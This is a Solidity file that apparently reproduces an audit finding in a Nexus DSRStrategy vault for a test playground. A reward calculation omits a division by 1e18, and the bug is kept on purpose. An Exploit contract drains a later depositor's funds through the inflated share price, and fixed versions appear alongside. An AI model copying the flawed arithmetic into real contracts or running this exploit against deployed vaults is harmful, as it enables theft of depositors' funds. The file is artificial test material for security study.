// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Nexus DSRStrategy — getRewards multiplies sDAI by convertToAssets(1e18) and skips / 1e18
    (Pashov, finding #44979).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: assetBalance is larger than the real sDAI balance by 1e18. DepositUSD folds that
    number into sharePrice, so the next depositor receives 1 share for 1 ether and the early
    depositor redeems both balances. Vulnerable line preserved verbatim below (@> VULN). */

contract SDai {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function convertToAssets(uint256 shares) external pure returns (uint256) {
        return shares;
    }
}

contract DSRStrategy {
    struct StrategyStruct {
        uint256 valueDeposited;
        uint256 rewardsEarned;
        uint256 valueWithdrawn;
    }

    SDai public token;

    constructor(SDai _token) {
        token = _token;
    }

    function getRewards(address receiver, StrategyStruct memory _strategyBalance) public view returns (uint256) {
        uint256 balance_strategy =
            _strategyBalance.valueDeposited + _strategyBalance.rewardsEarned - _strategyBalance.valueWithdrawn;
        // @> VULN: balance * convertToAssets(1e18) is 1e18 times too large because the rate is not divided back out
        uint256 assetBalance = token.balanceOf(receiver) * SDai(address(token)).convertToAssets(1e18);
        if (assetBalance > balance_strategy) {
            return assetBalance - balance_strategy;
        } else {
            return 0;
        }
    }
}

contract DSRStrategyFixed {
    struct StrategyStruct {
        uint256 valueDeposited;
        uint256 rewardsEarned;
        uint256 valueWithdrawn;
    }

    SDai public token;

    constructor(SDai _token) {
        token = _token;
    }

    function getRewards(address receiver, StrategyStruct memory _strategyBalance) public view returns (uint256) {
        uint256 balance_strategy =
            _strategyBalance.valueDeposited + _strategyBalance.rewardsEarned - _strategyBalance.valueWithdrawn;
        uint256 assetBalance = token.balanceOf(receiver) * SDai(address(token)).convertToAssets(1e18) / 1e18;
        if (assetBalance > balance_strategy) {
            return assetBalance - balance_strategy;
        } else {
            return 0;
        }
    }
}

contract DepositUSD {
    struct StrategyStruct {
        uint256 valueDeposited;
        uint256 rewardsEarned;
        uint256 valueWithdrawn;
    }

    SDai public token;
    DSRStrategy public strategy;
    StrategyStruct public strat;
    uint256 public nMinted;
    uint256 public deposited;
    uint256 public withdrawn;
    uint256 public rewardsClaimed;
    uint256 public sharePrice = 1e18;
    mapping(address => uint256) public balanceOf;

    constructor(SDai _token, DSRStrategy _strategy) {
        token = _token;
        strategy = _strategy;
    }

    function deposit(uint256 value) external returns (uint256 shares) {
        token.transferFrom(msg.sender, address(this), value);
        if (nMinted == 0) shares = value;
        else shares = sharePrice * value / 1e18;
        nMinted += shares;
        balanceOf[msg.sender] += shares;
        deposited += value;
        strat.valueDeposited += value;
    }

    function updateRewards() external {
        DSRStrategy.StrategyStruct memory snapshot = DSRStrategy.StrategyStruct({
            valueDeposited: strat.valueDeposited,
            rewardsEarned: strat.rewardsEarned,
            valueWithdrawn: strat.valueWithdrawn
        });
        uint256 rewardsEarned = strategy.getRewards(address(this), snapshot);
        if (rewardsEarned > 0) {
            strat.rewardsEarned += rewardsEarned;
            rewardsClaimed += rewardsEarned;
        }
        if (nMinted == 0) sharePrice = 1e18;
        else sharePrice = nMinted * 1e18 / (deposited - withdrawn + rewardsClaimed);
    }

    function withdraw(uint256 shares) external returns (uint256 assets) {
        require(balanceOf[msg.sender] >= shares, "shares");
        assets = token.balanceOf(address(this)) * shares / nMinted;
        balanceOf[msg.sender] -= shares;
        nMinted -= shares;
        withdrawn += assets;
        strat.valueWithdrawn += assets;
        token.transfer(msg.sender, assets);
    }
}

contract DepositUSDFixed {
    struct StrategyStruct {
        uint256 valueDeposited;
        uint256 rewardsEarned;
        uint256 valueWithdrawn;
    }

    SDai public token;
    DSRStrategyFixed public strategy;
    StrategyStruct public strat;
    uint256 public nMinted;
    uint256 public deposited;
    uint256 public withdrawn;
    uint256 public rewardsClaimed;
    uint256 public sharePrice = 1e18;
    mapping(address => uint256) public balanceOf;

    constructor(SDai _token, DSRStrategyFixed _strategy) {
        token = _token;
        strategy = _strategy;
    }

    function deposit(uint256 value) external returns (uint256 shares) {
        token.transferFrom(msg.sender, address(this), value);
        if (nMinted == 0) shares = value;
        else shares = sharePrice * value / 1e18;
        nMinted += shares;
        balanceOf[msg.sender] += shares;
        deposited += value;
        strat.valueDeposited += value;
    }

    function updateRewards() external {
        DSRStrategyFixed.StrategyStruct memory snapshot = DSRStrategyFixed.StrategyStruct({
            valueDeposited: strat.valueDeposited,
            rewardsEarned: strat.rewardsEarned,
            valueWithdrawn: strat.valueWithdrawn
        });
        uint256 rewardsEarned = strategy.getRewards(address(this), snapshot);
        if (rewardsEarned > 0) {
            strat.rewardsEarned += rewardsEarned;
            rewardsClaimed += rewardsEarned;
        }
        if (nMinted == 0) sharePrice = 1e18;
        else sharePrice = nMinted * 1e18 / (deposited - withdrawn + rewardsClaimed);
    }

    function withdraw(uint256 shares) external returns (uint256 assets) {
        require(balanceOf[msg.sender] >= shares, "shares");
        assets = token.balanceOf(address(this)) * shares / nMinted;
        balanceOf[msg.sender] -= shares;
        nMinted -= shares;
        withdrawn += assets;
        strat.valueWithdrawn += assets;
        token.transfer(msg.sender, assets);
    }
}

contract Victim {
    function deposit(DepositUSD vault, SDai token, uint256 amount) external {
        token.approve(address(vault), amount);
        vault.deposit(amount);
    }

    function depositFixed(DepositUSDFixed vault, SDai token, uint256 amount) external {
        token.approve(address(vault), amount);
        vault.deposit(amount);
    }
}

contract Exploit {
    SDai public token; // CREATE nonce 1
    DSRStrategy public strategy; // CREATE nonce 2
    DepositUSD public vault; // CREATE nonce 3
    Victim public victim; // CREATE nonce 4

    constructor() {
        token = new SDai();
        strategy = new DSRStrategy(token);
        vault = new DepositUSD(token, strategy);
        victim = new Victim();
        token.mint(address(this), 1 ether);
    }

    function run() external {
        token.approve(address(vault), 1 ether);
        uint256 earlyShares = vault.deposit(1 ether);
        require(earlyShares == 1 ether, "early shares");
        vault.updateRewards();
        require(vault.sharePrice() == 1, "inflated price");
        token.mint(address(victim), 1 ether);
        victim.deposit(vault, token, 1 ether);
        require(vault.balanceOf(address(victim)) == 1, "late share");
        uint256 got = vault.withdraw(earlyShares);
        uint256 one = 1 ether;
        uint256 both = (2 * one) * one / (one + 1);
        require(got == both, "early redeemed both");
        require(token.balanceOf(address(this)) == got, "attacker balance");
        require(token.balanceOf(address(vault)) == 2, "dust left");
    }
}
